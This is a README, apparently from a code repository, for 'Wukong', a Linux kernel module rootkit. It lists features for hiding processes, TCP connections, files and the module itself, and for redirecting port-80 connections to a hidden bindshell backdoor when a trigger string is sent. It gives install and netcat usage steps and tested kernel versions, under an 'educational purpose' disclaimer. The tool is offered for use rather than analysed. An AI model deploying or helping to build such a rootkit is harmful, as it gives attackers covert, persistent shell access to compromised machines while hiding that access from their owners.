# Wukong: a LKM rootkit for Linux kernel 2.6.x, 3.x and 4.x<br />

<br />
<h2>
	<span style="color:#E53333;">Note:</span> 
</h2>
<span style="color:#E53333;"><strong>&nbsp;&nbsp;&nbsp;&nbsp;This kernel rootkit is just for educational purpose and it shouldn't be used for any illegal activities, use this at your own risk.</strong></span><br />
<br />
<br />
<br />
<h2>
	Function
</h2>
&nbsp;&nbsp;&nbsp;&nbsp;1. Hide Linux Process.<br />
&nbsp;&nbsp;&nbsp;&nbsp;2. Hide TCP connection.<br />
&nbsp;&nbsp;&nbsp;&nbsp;3. Hide File/Directory.<br />
&nbsp;&nbsp;&nbsp;&nbsp;4. Hide wukong.ko.<br />
&nbsp;&nbsp;&nbsp;&nbsp;5. Redirect TCP connection to backdoor server by using the specific confidential password.<br />
<br />
<h2>
	Usage
</h2>
&nbsp;&nbsp;&nbsp;&nbsp;1. Environment:<br />
&nbsp;&nbsp;&nbsp;&nbsp;ubunt-14.04 (1.1.1.33) --- (1.1.1.1)ubunt-14.04 &nbsp;<br />
&nbsp;&nbsp;&nbsp;&nbsp;(client)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (server)<br />
<br />
&nbsp;&nbsp;&nbsp;&nbsp;2. Test step:<br />
&nbsp;&nbsp;&nbsp;&nbsp;a. on server<br />
&nbsp;&nbsp;&nbsp;&nbsp;cd wukong/<br />
&nbsp;&nbsp;&nbsp;&nbsp;sudo ./install.pl<br />
&nbsp;&nbsp;&nbsp;&nbsp;sudo nc -k -l 80<br />
<br />
&nbsp;&nbsp;&nbsp;&nbsp;b. on client<br />
&nbsp;&nbsp;&nbsp;&nbsp;nc 1.1.1.1 80<br />
&nbsp;&nbsp;&nbsp;&nbsp;http<br />
&nbsp;&nbsp;&nbsp;&nbsp;ifconfig<br />
&nbsp;&nbsp;&nbsp;&nbsp;PS：The connection will be redirected to bindshell<br />
<br />
&nbsp;&nbsp;&nbsp;&nbsp;nc 1.1.1.1 80<br />
&nbsp;&nbsp;&nbsp;&nbsp;111111<br />
&nbsp;&nbsp;&nbsp;&nbsp;PS: a rst will be received.<br />
<br />
&nbsp;&nbsp;&nbsp;&nbsp;nc 1.1.1.1 80<br />
&nbsp;&nbsp;&nbsp;&nbsp;111111<br />
&nbsp;&nbsp;&nbsp;&nbsp;aaaaaa<br />
&nbsp;&nbsp;&nbsp;&nbsp;PS: The connection will be connected with tcp 80.<br />
<br />
&nbsp;&nbsp;&nbsp;&nbsp;3. Result:<br />
&nbsp;&nbsp;&nbsp;&nbsp;a. Bindshell file is hidden.<br />
&nbsp;&nbsp;&nbsp;&nbsp;b. Tcp 8000 connection is hidden.<br />
&nbsp;&nbsp;&nbsp;&nbsp;c. Bindshell process is hidden<br />
&nbsp;&nbsp;&nbsp; d. wukong.ko is hidden<br />
&nbsp;&nbsp;&nbsp;&nbsp;e. If "http" is the first four bytes to TCP 80, connection will be established with bindshell.<br />
<br />
<br />
<h2>
	Tested OS:
</h2>
&nbsp;&nbsp;&nbsp;&nbsp;CentOS-5.5-i386-bin-DVD.iso<br />
&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;Linux&nbsp; 2.6.18-408.el5 #1 SMP Tue Jan 19 09:13:33 EST 2016 i686 i686 i386 GNU/Linux<br />
&nbsp;&nbsp;&nbsp;&nbsp;CentOS-5.5-x86_64-bin-DVD<br />
&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;Linux 2.6.18-194.el5 #1 SMP Fri Apr 2 14:58:14 EDT 2010 x86_64 x86_64 x86_64 GNU/Linux<br />
&nbsp;&nbsp;&nbsp;&nbsp;ubuntu-14.04.2-desktop-i386.iso<br />
&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;Linux&nbsp; 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux<br />
&nbsp;&nbsp;&nbsp;&nbsp;ubuntu-14.04.2-desktop-amd64.iso&nbsp; &nbsp;<br />
&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;Linux&nbsp; 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:43:14 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux<br />
&nbsp;&nbsp;&nbsp;&nbsp;ubuntu-14.04.3-desktop-i386.iso<br />
&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;Linux&nbsp; 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux<br />
&nbsp;&nbsp;&nbsp;&nbsp;ubuntu-14.04.3-desktop-amd64.iso<br />
&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;Linux&nbsp; 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux<br />
<br />
<br />
<h2>
	ToDo:
</h2>
&nbsp;&nbsp;&nbsp; Do performance tuning, make it can work on Linux server with large traffic.<br />
&nbsp;&nbsp;&nbsp; Adding more features.
